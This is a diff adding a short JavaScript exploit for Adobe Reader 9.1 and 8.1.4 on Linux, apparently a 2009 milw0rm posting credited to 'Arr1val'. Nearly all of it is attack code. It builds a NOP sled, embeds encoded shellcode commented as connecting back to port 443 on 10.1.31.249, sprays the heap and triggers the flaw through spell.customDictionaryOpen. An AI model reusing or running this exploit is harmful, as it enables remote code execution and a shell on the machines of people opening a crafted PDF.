@@ -1,0 +1,31 @@
+//##############
+//Exploit made by Arr1val
+//Proved in adobe 9.1 and adobe 8.1.4 on linux
+//##############
+
+var memory;
+function New_Script()
+{
+	var nop = unescape("%u9090%u9090");
+var shellcode = unescape("%uc92b%ue983%ud9ee%ud9ee%u2474%u5bf4%u7381%uc513%u4871%u83a5%ufceb%uf4e2%uaaf4%ue61b%u1b96%ucf4a%u29a3%u44c1%uf108%ufcdb%u4e75%u2585%u088c%ufeb1%u199f%ua442%u88da%ucd2e%ucac4%uc30b%uf896%u15a9%u21a3%uf619%u904c%u680b%u2345%u8a20%u02ea%ucd20%u13ea%ucb21%u924c%uf61a%u904c%uaef8%uf108%ua548");//443 on 10.1.31.249
+
+	while(nop.length <= 0x10000/2) nop+=nop;
+	nop=nop.substring(0,0x10000/2 - shellcode.length);
+
+	memory=new Array();
+	for(i=0;i<0x6ff0;i++)
+	{memory[i]=nop + shellcode;}
+
+//start exploit now
+start();
+
+function start()
+{
+	this.spell.customDictionaryOpen(0,nop);//so the exploit jumps actually to 0x90909090. Place a very long 'AAAA' at the second param to go to 0x41414141 ;)
+}
+
+}
+
+//############################
+
+# milw0rm.com [2009-04-29]
